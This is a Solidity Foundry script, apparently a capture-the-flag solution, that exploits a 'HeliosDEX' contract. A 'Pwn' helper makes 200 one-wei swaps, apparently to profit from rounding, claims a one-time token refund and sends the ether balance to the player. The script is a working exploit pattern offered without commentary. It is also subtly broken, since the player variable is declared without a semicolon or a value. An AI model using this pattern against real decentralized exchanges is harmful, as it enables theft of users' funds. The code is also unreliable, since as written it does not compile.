pragma solidity ^0.8.20;

import {Script,console} from "forge-std/Script.sol";
import {Setup,HeliosDEX} from "src/blockchain_heliosdex/Setup.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Exploit is Script{
    function run()public{
        vm.startBroadcast();
        address _player
        Setup _setup=Setup(address(0x6e169f6f46257a639528548E08B838E718894618));
        HeliosDEX _heliosdex=_setup.TARGET();
        Pwn pwn=new Pwn();
        pwn.Exploit{value:200}(_heliosdex, _player);
        vm.stopBroadcast();
    }
}


contract Pwn{

    function Exploit(HeliosDEX _helios,address _player)public payable{
        ERC20 _hls;
        _hls=_helios.heliosLuminaShards();
        for(uint8 i=0;i<200;i++){
            _helios.swapForHLS{value: 1}();
        }
        _hls.approve(address(_helios),200);
        _helios.oneTimeRefund(address(_hls), 200);
        payable(_player).transfer(address(this).balance);
    }

    receive()external payable{}
}